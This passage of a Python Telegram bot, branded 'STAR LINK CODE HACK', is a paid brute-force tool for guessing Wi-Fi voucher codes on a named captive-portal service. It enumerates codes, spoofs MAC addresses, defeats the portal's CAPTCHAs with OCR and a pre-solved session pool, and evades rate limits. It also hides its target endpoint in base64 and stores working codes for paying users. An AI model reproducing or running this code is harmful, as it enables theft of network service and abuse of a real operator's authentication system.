    active = sum(1 for d in scan_tasks.values() if not d["task"].done())
    uptime = int(time.monotonic() - _start_time)
    h, rem = divmod(uptime, 3600)
    m, s = divmod(rem, 60)
    gs = _global_stats
    elapsed = max(1.0, time.monotonic() - gs["start_ts"])
    avg_speed = gs["total_checked"] / elapsed * 60
    text = (
        f"🪫 <b>Bot Live Dashboard</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"⏳ Uptime        : {h}h {m}m {s}s\n"
        f"🔍 Active Scans  : <b>{active}</b> / {MAX_CONCURRENT_SCANS}\n"
        f"🎫 Paid Users    : {len(paid_users)}\n"
        f"👥 Sessions      : {len(user_data)}\n"
        f"📦 Total Checked : <b>{gs['total_checked']:,}</b>\n"
        f"✅ Total Hits    : <b>{gs['total_hits']}</b>\n"
        f"🛡 Rate-limits   : {gs['rate_limits']}\n"
        f"⚡ Avg Speed     : <b>{avg_speed:,.0f}</b> c/min\n"
        f"🔗 Concurrency   : {CONCURRENCY}\n"
        f"📦 Batch Size    : {BATCH_SIZE}\n"
        f"🏊 Session Pool  : {SESSION_POOL_SIZE}"
    )
    await bot.reply_to(message, text, parse_mode="HTML")

@bot.message_handler(commands=["recheck"])
async def cmd_recheck(message):
    chat_id = message.chat.id
    user_id = str(chat_id)
    if not await is_paid(user_id):
        await bot.reply_to(
            message,
            f"❌ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\n"
            f"PAID USER ဖြစ်ရန် Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
        )
        return
    if chat_id not in user_data or "session_url" not in user_data.get(chat_id, {}):
        await bot.reply_to(message, "Scan လုပ်ရန် Portal URL ကိုအရင်ထည့်ပါ။")
        return
    results = await db_get_results(user_id)
    if not results:
        await bot.reply_to(message, "သင့်တွင် success code တစ်ခုမျှမရှိသေးပါ။")
        return
    await bot.reply_to(message, "Success Code များအား ပြန်လည်စစ်ဆေးနေပါသည်။")
    session_url = user_data[chat_id]["session_url"]
    recheck_list: List[str] = []
    for code in results:
        recode = await perform_check(
            session_url, code, chat_id, scan_id=None, recheck=True, message=message
        )
        if recode:
            recheck_list.append(recode)
    if recheck_list:
        entries = [f"🎫 <code>{c}</code>" for c in recheck_list]
        body = format_premium_success_list(entries)
        await bot.reply_to(message, body, parse_mode="HTML")
    else:
        await bot.reply_to(message, "Code များအားလုံးစစ်ပြီး success code မတွေ့ပါ။")
    await db_set_results(user_id, recheck_list)

@bot.message_handler(commands=["clearprogress"])
async def cmd_clearprogress(message):
    user_id = str(message.chat.id)
    if not await is_paid(user_id):
        return
    # Clear all progress for this user
    await _db_run(
        lambda: _get_conn().execute("DELETE FROM scan_progress WHERE user_id=?", (user_id,))
        or _get_conn().commit()
    )
    await bot.reply_to(message, "✅ Scan progress ရှင်းလင်းပြီးပါပြီ။ နောက်တစ်ခါ အစကနေ စပါမည်။")

# ============================================================
# CALLBACK HANDLER
# ============================================================
@bot.callback_query_handler(func=lambda call: True)
async def on_callback(call):
    chat_id = call.message.chat.id
    user_id = str(chat_id)
    user_name = call.from_user.first_name or call.from_user.username or "User"
    data = call.data

    try:
        if data == "menu_back":
            if await is_paid(user_id):
                text = (
                    "✨ <b>STAR LINK CODE HACK</b> ✨\n\n"
                    f"🪪 <b>NAME</b>: {user_name}\n📜 <b>USER ID</b>: <code>{user_id}</code>\n\n"
                    "🎫 PAID USER - Unlimited Access"
                )
            else:
                text = (
                    "✨ <b>STAR LINK CODE HACK</b> ✨\n\n"
                    f"🪪 <b>NAME</b>: {user_name}\n📜 <b>USER ID</b>: <code>{user_id}</code>\n\n"
                    "⚠️ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\n"
                    "PAID USER ဖြစ်ရန် PAID USER ကိုနှိပ်ပါ။"
                )
            await safe_edit_text(chat_id, call.message.message_id, text, get_main_keyboard())
            return

        if data == "menu_free_trial":
            if not await is_paid(user_id):
                await safe_edit_text(
                    chat_id, call.message.message_id,
                    f"❌ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\n"
                    f"PAID USER ဖြစ်ရန် Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
                    get_back_keyboard(),
                )
                return
            await safe_edit_text(
                chat_id, call.message.message_id,
                "🔗 Portal URL ထည့်သွင်းရန်:\n\n"
                "/portal [your_portal_url]\n\n"
                "ဥပမာ:\n"
                "/portal https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?lang=en_US&mac=02:00:00:00:00:00\n\n"
                "Portal URL အသစ်ထည့်ပါက ယခင် URL ပျက်သွားမည်။",
                get_back_keyboard(),
            )
            return

        if data == "menu_paid":
            await safe_edit_text(
                chat_id, call.message.message_id,
                "🔑 <b>PAID USER ဖြစ်ရန်</b>\n\n"
                "ကျေးဇူးပြု၍ သင်၏ USER ID ကိုထည့်ပါ။\n\n"
                f"USER ID: <code>{user_id}</code>\n\n"
                f"✅ USER ID ကို Admin ထံပေးပြီး Key ဝယ်ပါ။\n"
                f"👨‍💻 Admin: {ADMIN_USERNAME}\n\n"
                "Key ရရှိပြီးပါက PAID USER ဖြစ်ရန် နှိပ်ပါ",
                get_paid_keyboard(),
            )
            return

        if data == "menu_enter_userid":
            auth = await db_get_auth_list()
            if user_id in auth and check_key_expiration(auth[user_id]):
                paid_users.add(user_id)
                user_data.setdefault(chat_id, {})
                await safe_edit_text(
                    chat_id, call.message.message_id,
                    f"✅ <b>PAID USER</b> ဖြစ်ပါပြီ။\n\nUSER ID: <code>{user_id}</code>\n\nMenu မှ ရွေးချယ်ပါ။",
                    get_main_keyboard(),
                )
            elif user_id in auth:
                await safe_edit_text(
                    chat_id, call.message.message_id,
                    f"❌ Key Expired ဖြစ်နေပါသည်။ Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
                    get_back_keyboard(),
                )
            else:
                for admin_id in ADMINS:
                    await safe_send(
                        int(admin_id),
                        f"🔔 <b>New User Request</b>:\nName: {user_name}\nID: <code>{user_id}</code>\n\n"
                        f"To approve:\n/genkey unlimited {user_id}",
                    )
                await safe_edit_text(
                    chat_id, call.message.message_id,
                    f"🙏 ကျေးဇူးပြု၍ Paid ဝယ်ပါ။\n\nUSER ID: <code>{user_id}</code>\n\n"
                    f"Admin မှ သင့် ID ကို အတည်ပြုပြီးပါက PAID USER ဖြစ်ပါမည်။\n"
                    f"👨‍💻 Admin: {ADMIN_USERNAME}",
                    get_back_keyboard(),
                )
            return

        if data == "menu_result":
            if not await is_paid(user_id):
                await safe_edit_text(
                    chat_id, call.message.message_id,
                    f"❌ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\nAdmin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
                    get_back_keyboard(),
                )
                return
            results = await db_get_results(user_id)
            if results:
                entries = [f"🎫 <code>{c}</code>" for c in results]
                text = format_premium_success_list(entries)
                if len(text) > 4096:
                    text = text[:4090] + "..."
            else:
                text = "📋 Success code မရှိသေးပါ။"
            await safe_edit_text(chat_id, call.message.message_id, text, get_back_keyboard())
            return

        if data == "menu_recheck":
            if not await is_paid(user_id):
                await safe_edit_text(
                    chat_id, call.message.message_id,
                    f"❌ registered မလုပ်ရသေးပါ။ Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
                    get_back_keyboard(),
                )
                return
            if chat_id not in user_data or "session_url" not in user_data.get(chat_id, {}):
                await safe_edit_text(
                    chat_id, call.message.message_id,
                    "🔗 Portal URL အရင်ထည့်ပါ:\n\n/portal [your_portal_url]",
                    get_back_keyboard(),
                )
                return
            await safe_edit_text(
                chat_id, call.message.message_id,
                "🔄 Recheck စတင်နေပါသည်...",
                get_scam_button_keyboard(),
            )
            await cmd_recheck(call.message)
            return

        if data == "menu_stop":
            d = scan_tasks.get(chat_id)
            if d and not d["task"].done():
                d["stop"] = True
                d["scan_id"] = None
                d["task"].cancel()
                try:
                    await bot.answer_callback_query(call.id, "🛑 Scan ရပ်လိုက်ပါပြီ။", show_alert=True)
                except Exception:
                    pass
            else:
                try:
                    await bot.answer_callback_query(call.id, "Scan မရှိပါ။", show_alert=True)
                except Exception:
                    pass
            return

        if data.startswith("scan_"):
            if not await is_paid(user_id):
                await safe_edit_text(
                    chat_id, call.message.message_id,
                    f"❌ registered မလုပ်ရသေးပါ။ Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
                    get_back_keyboard(),
                )
                return
            mode = data.replace("scan_", "")
            user_data.setdefault(chat_id, {})
            if "session_url" not in user_data[chat_id]:
                await safe_edit_text(
                    chat_id, call.message.message_id,
                    "🔗 Portal URL အရင်ထည့်ပါ:\n\n/portal [your_portal_url]",
                    get_back_keyboard(),
                )
                return
            if mode in ("6", "7", "8", "9"):
                await safe_edit_text(
                    chat_id, call.message.message_id,
                    f"🔢 VOUCHER <b>{mode}</b> လုံးအတွက် ထိပ်စီးနံပါတ်ရွေးပါ —",
                    get_digit_keyboard(mode),
                )
                return
            user_data[chat_id]["selected_mode"] = mode
            user_data[chat_id]["start_digit"] = None
            await safe_edit_text(
                chat_id, call.message.message_id,
                f"🔍 VOUCHER: <code>{mode}</code>\n\n✅ START SCAM ကိုနှိပ်ပြီး စတင်ပါ။",
                get_start_scam_keyboard(),
            )
            return

        if data.startswith("digit_"):
            parts = data.split("_", 2)
            if len(parts) != 3:
                return
            _, mode, digit = parts
            user_data.setdefault(chat_id, {})
            user_data[chat_id]["selected_mode"] = mode
            if digit == "random":
                user_data[chat_id]["start_digit"] = str(random.randint(0, 9))
                label = f"Random ({user_data[chat_id]['start_digit']}xxx…)"
            else:
                user_data[chat_id]["start_digit"] = digit
                label = f"{digit} မှစ၍"
            await safe_edit_text(
                chat_id, call.message.message_id,
                f"🔍 VOUCHER: <code>{mode}</code>\n🔢 ထိပ်စီး: <b>{label}</b>\n\n✅ START SCAM ကိုနှိပ်ပါ။",
                get_start_scam_keyboard(),
            )
            return

        if data == "menu_start_scam":
            if not await is_paid(user_id):
                await safe_edit_text(
                    chat_id, call.message.message_id,
                    f"❌ registered မလုပ်ရသေးပါ။ Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
                    get_back_keyboard(),
                )
                return
            if chat_id not in user_data or "selected_mode" not in user_data.get(chat_id, {}):
                await safe_edit_text(
                    chat_id, call.message.message_id,
                    "❌ VOUCHER အမျိုးအစား မရွေးရသေးပါ။",
                    get_voucher_keyboard(),
                )
                return
            mode = user_data[chat_id]["selected_mode"]
            await safe_edit_text(
                chat_id, call.message.message_id,
                f"🔍 Scan စတင်နေပါသည်...\n\n🔢 Mode: <code>{mode}</code>",
                get_scam_button_keyboard(),
            )
            await _start_scan(chat_id, mode, message=call.message, user_name=user_name)
            return

    except Exception as e:
        log.exception("callback error data=%s: %s", data, e)
    finally:
        try:
            await bot.answer_callback_query(call.id)
        except Exception:
            pass

# ============================================================
# CODE GENERATORS
# ============================================================
_LOWER = string.ascii_lowercase
_LOWER_DIGIT = string.ascii_lowercase + string.digits

def _rand_digits(n: int) -> str:
    return "".join(random.choices(string.digits, k=n))

def _rand_lower(n: int) -> str:
    return "".join(random.choices(_LOWER, k=n))

def _rand_mixed(n: int) -> str:
    return "".join(random.choices(_LOWER_DIGIT, k=n))

def iter_codes(
    mode: str,
    start_digit: Optional[str] = None,
    chat_id: Optional[int] = None,
    resume_from: Optional[str] = None,
) -> Iterator[str]:
    tried = _tried_codes.get(chat_id, set()) if chat_id is not None else set()

    if mode in ("6", "7", "8"):
        length = int(mode)
        if start_digit is not None and str(start_digit).isdigit():
            d = int(start_digit)
            start = d * (10 ** (length - 1))
            end = (d + 1) * (10 ** (length - 1))
        else:
            start = random.randint(0, 10 ** length - 1)
            end = 10 ** length
            # wrap-around full range
            seq = list(range(start, end)) + list(range(0, start))
            if resume_from and resume_from.isdigit() and len(resume_from) == length:
                try:
                    idx = seq.index(int(resume_from))
                    seq = seq[idx + 1:]
                except ValueError:
                    pass
            for i in seq:
                yield str(i).zfill(length)
            return

        if resume_from and resume_from.isdigit() and len(resume_from) == length:
            try:
                rf = int(resume_from)
                if start <= rf < end:
                    start = rf + 1
            except ValueError:
                pass

        for i in range(start, end):
            yield str(i).zfill(length)
        return

    if mode == "9":
        while True:
            code = _rand_digits(9)
            if code not in tried:
                tried.add(code)
                if len(tried) > 50000:
                    tried.clear()
                yield code
        return

    if mode == "ascii-lower":
        while True:
            code = _rand_lower(6)
            if code not in tried:
                tried.add(code)
                if len(tried) > 30000:
                    tried.clear()
                yield code
        return

    if mode == "ascii-lower9":
        while True:
            code = _rand_lower(9)
            if code not in tried:
                tried.add(code)
                if len(tried) > 40000:
                    tried.clear()
                yield code
        return

    if mode in ("all", "mixed"):
        while True:
            code = _rand_mixed(6)
            if code not in tried:
                tried.add(code)
                if len(tried) > 30000:
                    tried.clear()
                yield code
        return

    if mode == "mixed8":
        while True:
            code = _rand_mixed(8)
            if code not in tried:
                tried.add(code)
                if len(tried) > 40000:
                    tried.clear()
                yield code
        return

    if mode == "mixed9":
        while True:
            code = _rand_mixed(9)
            if code not in tried:
                tried.add(code)
                if len(tried) > 50000:
                    tried.clear()
                yield code
        return

    raise ValueError(f"Unsupported scan mode: {mode}")

# ============================================================
# SESSION / MAC
# ============================================================
_UA_HTML = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0"
)

async def get_session_id(
    sess: aiohttp.ClientSession,
    session_url: str,
    previous_session_id: Optional[str] = None,
) -> Optional[str]:
    mac = get_mac()
    url = replace_mac(session_url, mac)
    headers = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "accept-language": "en-US,en;q=0.9",
        "referer": url,
        "user-agent": _UA_HTML,
    }
    try:
        async with sess.get(url, headers=headers, allow_redirects=True) as req:
            final = str(req.url)
            m = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", final)
            return m.group(1) if m else previous_session_id
    except Exception as e:
        log.debug("get_session_id failed: %s", e)
        return previous_session_id

# ============================================================
# CAPTCHA — Multi-pass OCR
# ============================================================
async def Captcha_Image(sess: aiohttp.ClientSession, session_id: str) -> bytes:
    headers = {
        "authority": "portal-as.ruijienetworks.com",
        "accept": "image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
        "referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?sessionId={session_id}",
        "user-agent": _UA_HTML,
    }
    params = {"sessionId": session_id, "_t": str(time.time())}
    async with sess.get(
        "https://portal-as.ruijienetworks.com/api/auth/captcha/image",
        params=params,
        headers=headers,
    ) as req:
        return await req.read()

async def Varify_Captcha(
    sess: aiohttp.ClientSession, session_id: str, text: str
) -> Optional[str]:
    headers = {
        "authority": "portal-as.ruijienetworks.com",
        "accept": "*/*",
        "content-type": "application/json",
        "origin": "https://portal-as.ruijienetworks.com",
        "referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?sessionId={session_id}",
        "user-agent": _UA_HTML,
    }
    payload = {"sessionId": session_id, "authCode": text}
    try:
        async with sess.post(
            "https://portal-as.ruijienetworks.com/api/auth/captcha/verify",
            headers=headers,
            json=payload,
        ) as req:
            data = await req.json()
            return session_id if data.get("success") else None
    except Exception as e:
        log.debug("captcha verify failed: %s", e)
        return None

_ocr = ddddocr.DdddOcr(show_ad=False)

def _ocr_variants(image_bytes: bytes) -> List[str]:
    """Multi-pass OCR: return unique candidates from different pre-processings."""
    results: List[str] = []
    try:
        nparr = np.frombuffer(image_bytes, np.uint8)
        img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
        if img is None:
            return results

        gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)

        variants = []
        # 1. Otsu
        blur = cv2.GaussianBlur(gray, (3, 3), 0)
        _, t1 = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
        variants.append(t1)
        # 2. Inverted Otsu
        variants.append(cv2.bitwise_not(t1))
        # 3. Adaptive
        t2 = cv2.adaptiveThreshold(gray, 255, cv2.ADAPTIVE_THRESH_GAUSSIAN_C, cv2.THRESH_BINARY, 11, 2)
        variants.append(t2)
        # 4. Morph close
        kernel = np.ones((2, 2), np.uint8)
        variants.append(cv2.morphologyEx(t1, cv2.MORPH_CLOSE, kernel))

        seen: Set[str] = set()
        for v in variants:
            try:
                _, buf = cv2.imencode(".png", v)
                txt = _ocr.classification(buf.tobytes())
                if txt:
                    t = txt.upper().strip()
                    if t and t not in seen:
                        seen.add(t)
                        results.append(t)
            except Exception:
                continue
    except Exception as e:
        log.debug("ocr_variants error: %s", e)
    return results

async def Captcha_Text_Multi(image_bytes: bytes) -> List[str]:
    try:
        return await asyncio.to_thread(_ocr_variants, image_bytes)
    except Exception as e:
        log.debug("captcha_text_multi error: %s", e)
        return []

# ============================================================
# SESSION POOL (warm session_id + auth_code)
# ============================================================
class SessionPool:
    """Pre-solves captchas so workers can grab ready pairs quickly."""

    def __init__(self, session_url: str, size: int = SESSION_POOL_SIZE):
        self.session_url = session_url
        self.size = size
        self.queue: asyncio.Queue = asyncio.Queue(maxsize=size + 4)
        self._stop = False
        self._workers: List[asyncio.Task] = []
        self._lock = asyncio.Lock()

    async def start(self) -> None:
        for _ in range(max(2, SESSION_POOL_REFILL)):
            t = asyncio.create_task(self._producer())
            self._workers.append(t)

    async def stop(self) -> None:
        self._stop = True
        for t in self._workers:
            t.cancel()
        for t in self._workers:
            try:
                await t
            except (asyncio.CancelledError, Exception):
                pass
        self._workers.clear()

    async def _producer(self) -> None:
        while not self._stop:
            try:
                if self.queue.qsize() >= self.size:
                    await asyncio.sleep(0.25)
                    continue
                pair = await self._create_pair()
                if pair:
                    try:
                        self.queue.put_nowait(pair)
                    except asyncio.QueueFull:
                        pass
                else:
                    await asyncio.sleep(0.2)
            except asyncio.CancelledError:
                break
            except Exception as e:
                log.debug("session pool producer: %s", e)
                await asyncio.sleep(0.3)

    async def _create_pair(self) -> Optional[Tuple[str, str]]:
        timeout = aiohttp.ClientTimeout(total=12)
        try:
            async with aiohttp.ClientSession(
                connector=_connector,
                connector_owner=False,
                cookie_jar=aiohttp.CookieJar(),
                timeout=timeout,
            ) as sess:
                sid = await get_session_id(sess, self.session_url)
                if not sid:
                    return None
                for _ in range(CAPTCHA_RETRIES):
                    try:
                        img = await Captcha_Image(sess, sid)
                        candidates = await Captcha_Text_Multi(img)
                        for txt in candidates:
                            if await Varify_Captcha(sess, sid, txt):
                                return (sid, txt)
                    except Exception:
                        continue
        except Exception as e:
            log.debug("create_pair error: %s", e)
        return None

    async def get(self, timeout: float = 8.0) -> Optional[Tuple[str, str]]:
        try:
            return await asyncio.wait_for(self.queue.get(), timeout=timeout)
        except (asyncio.TimeoutError, Exception):
            return None

# ============================================================
# VOUCHER BALANCE
# ============================================================
async def Code_Expires_Date(active_id: str) -> Tuple[str, Any]:
    """
    Fetch precise voucher balance info and return a detailed multi-line
    HTML block for success display.
    """
    paths = [
        f"https://portal-as.ruijienetworks.com/api/macc2/balance/getBalance/{active_id}",
        f"https://portal-as.ruijienetworks.com/api/macc/balance/getBalance/{active_id}",
        f"https://portal-as.ruijienetworks.com/api/maccauth/balance/getBalance/{active_id}",
        f"https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{active_id}",
    ]
    headers = {
        "authority": "portal-as.ruijienetworks.com",
        "accept": "application/json, text/javascript, */*; q=0.01",
        "content-type": "application/json;",
        "user-agent": _UA_HTML,
        "x-requested-with": "XMLHttpRequest",
    }
    timeout = aiohttp.ClientTimeout(total=8)
    try:
        async with aiohttp.ClientSession(
            connector=_connector,
            connector_owner=False,
            cookie_jar=aiohttp.CookieJar(),
            timeout=timeout,
        ) as s:
            for url in paths:
                try:
                    async with s.get(url, headers=headers) as req:
                        if req.status != 200:
                            continue
                        resp = await req.json()
                        if not resp.get("success"):
                            continue
                        result = resp.get("result", {}) or {}

                        # Extract all useful fields (RuiJie varies by version)
                        profile = (
                            result.get("profileName")
                            or result.get("packageName")
                            or result.get("planName")
                            or result.get("userProfile")
                            or "Unknown"
                        )
                        total_mins = result.get("totalMinutes")
                        remain_mins = result.get("remainingMinutes")
                        used_mins = result.get("usedMinutes")
                        if remain_mins is None and total_mins is not None and used_mins is not None:
                            try:
                                remain_mins = int(total_mins) - int(used_mins)
                            except Exception:
                                pass
                        if total_mins is None and remain_mins is not None:
                            total_mins = remain_mins

                        # Bandwidth / traffic if present
                        total_flow = result.get("totalFlow") or result.get("totalTraffic")
                        remain_flow = result.get("remainingFlow") or result.get("remainTraffic")
                        used_flow = result.get("usedFlow") or result.get("usedTraffic")

                        # Expire timestamp if any
                        expire_at = (
                            result.get("expireTime")
                            or result.get("expireDate")
                            or result.get("endTime")
                            or result.get("validTo")
                        )

                        lines: List[str] = []
                        lines.append(f"┃ 📋 Plan     : <b>{profile}</b>")

                        if total_mins is not None:
                            lines.append(f"┃ ⏳ Total    : <b>{minute_to_hour(total_mins)}</b>")
                        if remain_mins is not None:
                            lines.append(f"┃ 🟢 Remain   : <b>{minute_to_hour(remain_mins)}</b>")
                        if used_mins is not None:
                            lines.append(f"┃ 🔴 Used     : <b>{minute_to_hour(used_mins)}</b>")

                        if total_flow is not None or remain_flow is not None:
                            def _fmt_flow(v):
                                try:
                                    n = float(v)
                                    if n >= 1024 * 1024:
                                        return f"{n / (1024*1024):.2f} GB"
                                    if n >= 1024:
                                        return f"{n / 1024:.1f} MB"
                                    return f"{n:.0f} KB"
                                except Exception:
                                    return str(v)
                            if total_flow is not None:
                                lines.append(f"┃ 📦 Traffic  : {_fmt_flow(total_flow)}")
                            if remain_flow is not None:
                                lines.append(f"┃ 🟢 Left     : {_fmt_flow(remain_flow)}")
                            if used_flow is not None:
                                lines.append(f"┃ 🔴 Used Data: {_fmt_flow(used_flow)}")

                        if expire_at:
                            lines.append(f"┃ 📅 Expire   : <code>{expire_at}</code>")

                        # Fallback if almost nothing found
                        if len(lines) <= 1:
                            lines.append(f"┃ ⏳ Time     : <b>{minute_to_hour(remain_mins or total_mins or 'Unknown')}</b>")

                        detail = "\n".join(lines) + "\n"
                        return detail, remain_mins if remain_mins is not None else total_mins
                except Exception:
                    continue
    except Exception as e:
        log.debug("Code_Expires_Date outer error: %s", e)
    return "┃ 📋 Plan     : Unknown\n┃ ⏳ Time     : Unknown\n", "Unknown"

# ============================================================
# PERFORM CHECK
# ============================================================
_POST_URL = base64.b64decode(
    b"aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM="
).decode()

async def perform_check(
    session_url: str,
    code: str,
    chat_id: int,
    scan_id: Optional[str] = None,
    recheck: bool = False,
    message=None,
    pool: Optional[SessionPool] = None,
    rate_state: Optional[Dict[str, float]] = None,
) -> Optional[str]:
    if not recheck:
        current = scan_tasks.get(chat_id)
        if not current or current.get("scan_id") != scan_id:
            return None

    post_headers = {
        "authority": "portal-as.ruijienetworks.com",
        "accept": "*/*",
        "content-type": "application/json",
        "origin": "https://portal-as.ruijienetworks.com",
        "user-agent": (
            "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 "
            "(KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36"
        ),
    }

    response: Optional[str] = None
    session_id: Optional[str] = None

    for attempt in range(CHECK_RETRIES + 1):
        # Smart rate-limit backoff
        if rate_state and rate_state.get("sleep", 0) > 0:
            await asyncio.sleep(rate_state["sleep"])

        timeout = aiohttp.ClientTimeout(total=16)
        try:
            async with aiohttp.ClientSession(
                connector=_connector,
                connector_owner=False,
                cookie_jar=aiohttp.CookieJar(),
                timeout=timeout,
            ) as sess:
                auth_code: Optional[str] = None

                # Prefer warm pair from pool
                if pool and not recheck:
                    pair = await pool.get(timeout=3.0)
                    if pair:
                        session_id, auth_code = pair

                if not session_id or not auth_code:
                    session_id = await get_session_id(sess, session_url)
                    if not session_id:
                        await asyncio.sleep(0.12)
                        continue
                    for _ in range(CAPTCHA_RETRIES):
                        try:
                            img = await Captcha_Image(sess, session_id)
                            candidates = await Captcha_Text_Multi(img)
                            for txt in candidates:
                                if await Varify_Captcha(sess, session_id, txt):
                                    auth_code = txt
                                    break
                            if auth_code:
                                break
                        except Exception:
                            continue

                if not auth_code or not session_id:
                    await asyncio.sleep(0.1)
                    continue

                if not recheck:
                    current = scan_tasks.get(chat_id)
                    if not current or current.get("scan_id") != scan_id or current.get("stop"):
                        return None

                payload = {
                    "accessCode": code,
                    "sessionId": session_id,
                    "apiVersion": 1,
                    "authCode": auth_code,
                }
                post_headers["referer"] = (
                    f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html"
                    f"?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId={session_id}"
                )

                async with sess.post(_POST_URL, json=payload, headers=post_headers) as req:
                    response = await req.text()

        except Exception as e:
            log.debug("perform_check attempt %d: %s", attempt + 1, e)
            continue

        if response and "request limited" in response.lower():
            _global_stats["rate_limits"] += 1
            if rate_state is not None:
                rate_state["sleep"] = min(
                    RATE_LIMIT_MAX_SLEEP,
                    rate_state.get("sleep", RATE_LIMIT_BASE_SLEEP) * 1.6 + 0.15,
                )
                rate_state["hits"] = rate_state.get("hits", 0) + 1
            await asyncio.sleep(rate_state["sleep"] if rate_state else 0.5)
            continue

        # Success path → slowly reduce backoff
        if rate_state is not None and rate_state.get("sleep", 0) > RATE_LIMIT_BASE_SLEEP:
            rate_state["sleep"] = max(RATE_LIMIT_BASE_SLEEP, rate_state["sleep"] * 0.85)
        break

    if not response:
        return None

    _global_stats["total_checked"] += 1

    # --- SUCCESS ---
    if "logonUrl" in response:
        if recheck:
            return code

        _global_stats["total_hits"] += 1
        expire_display, _raw = await Code_Expires_Date(session_id or "")
        entry = format_success_entry(code, expire_display)

        success_texts.setdefault(chat_id, []).append(entry)
        user_data.setdefault(chat_id, {}).setdefault("current_display_codes", []).append(entry)
        await db_add_result(str(chat_id), code)

        # Premium success alert (with notification)
        try:
            alert = (
                f"🎉 <b>SUCCESS HIT!</b>\n\n"
                f"{entry}\n\n"
                f"⏱ {datetime.now(timezone.utc).strftime('%H:%M:%S UTC')}"
            )
            await bot.send_message(chat_id, alert, parse_mode="HTML", disable_notification=False)
        except Exception:
            pass

        if message is not None:
            try:
                display_codes = user_data[chat_id]["current_display_codes"]
                body = format_premium_success_list(display_codes)
                if len(body) > 3900:
                    display_codes = display_codes[-4:]
                    user_data[chat_id]["current_display_codes"] = display_codes
                    body = format_premium_success_list(display_codes)

                if chat_id not in success_messages:
                    sent = await bot.send_message(chat_id, body, parse_mode="HTML")
                    success_messages[chat_id] = sent.message_id
                else:
                    try:
                        await bot.edit_message_text(
                            text=body,
                            chat_id=chat_id,
                            message_id=success_messages[chat_id],
                            parse_mode="HTML",
                        )
                    except Exception:
                        sent = await bot.send_message(chat_id, body, parse_mode="HTML")
                        success_messages[chat_id] = sent.message_id
            except Exception as e:
                log.warning("success message error: %s", e)

    elif "STA" in response:
        limited_texts.setdefault(chat_id, []).append(code)
        if message is not None:
            try:
                body = "\n".join(limited_texts[chat_id][-25:])
                if len(body) > 3700:
                    body = body[-3700:]
                text = f"⚠️ <b>Limited Codes</b>\n\n<code>{body}</code>"
                if chat_id not in limited_messages:
                    sent = await bot.send_message(chat_id, text, parse_mode="HTML")
                    limited_messages[chat_id] = sent.message_id
                else:
                    try:
                        await bot.edit_message_text(
                            text=text,
                            chat_id=chat_id,
                            message_id=limited_messages[chat_id],
                            parse_mode="HTML",
                        )
                    except Exception:
                        sent = await bot.send_message(chat_id, text, parse_mode="HTML")
                        limited_messages[chat_id] = sent.message_id
            except Exception as e:
                log.warning("limited message error: %s", e)

    return None

# ============================================================
# RUN BRUTEFORCE
# ============================================================
async def run_bruteforce(
    mode: str,
    chat_id: int,
    session_url: str,
    scan_id: str,
    message=None,
    progress_msg=None,
    start_digit: Optional[str] = None,
    resume_from: Optional[str] = None,
):
    try:
        code_iter = iter_codes(
            mode, start_digit=start_digit, chat_id=chat_id, resume_from=resume_from
        )
    except ValueError as e:
        await safe_send(chat_id, str(e))
        await release_scan_slot()
        return

    total: Optional[int] = None
    if mode in ("6", "7", "8"):
        length = int(mode)
        if start_digit is not None and str(start_digit).isdigit():
            total = 10 ** (length - 1)
        else:
            total = 10 ** length

    checked = 0
    scan_start = time.monotonic()
    last_key_check = scan_start
    last_progress = 0.0
    last_save = scan_start
    file_sent = False
    rate_state: Dict[str, float] = {"sleep": 0.0, "hits": 0}
    last_code: Optional[str] = None

    pool = SessionPool(session_url, size=SESSION_POOL_SIZE)
    await pool.start()

    try:
        sem = await get_voucher_sem()

        while True:
            current = scan_tasks.get(chat_id)
            if not current or current.get("scan_id") != scan_id or current.get("stop"):
                break

            batch: List[str] = []
            for _ in range(BATCH_SIZE):
                try:
                    c = next(code_iter)
                    batch.append(c)
                    last_code = c
                except StopIteration:
                    break
            if not batch:
                # finished sequential range → clear progress
                if mode in ("6", "7", "8"):
                    await db_clear_progress(str(chat_id), mode, start_digit)
                break

            now = time.monotonic()
            if now - last_key_check >= KEY_RECHECK_INTERVAL:
                if not await is_paid(str(chat_id)):
                    await safe_send(chat_id, "သင်၏ key သက်တမ်း ကုန်ဆုံးသွားပါပြီ။")
                    break
                last_key_check = now

            async def _check(c: str):
                async with sem:
                    cur = scan_tasks.get(chat_id)
                    if not cur or cur.get("scan_id") != scan_id or cur.get("stop"):
                        return
                    await perform_check(
                        session_url,
                        c,
                        chat_id,
                        scan_id,
                        message=message,
                        pool=pool,
                        rate_state=rate_state,
                    )

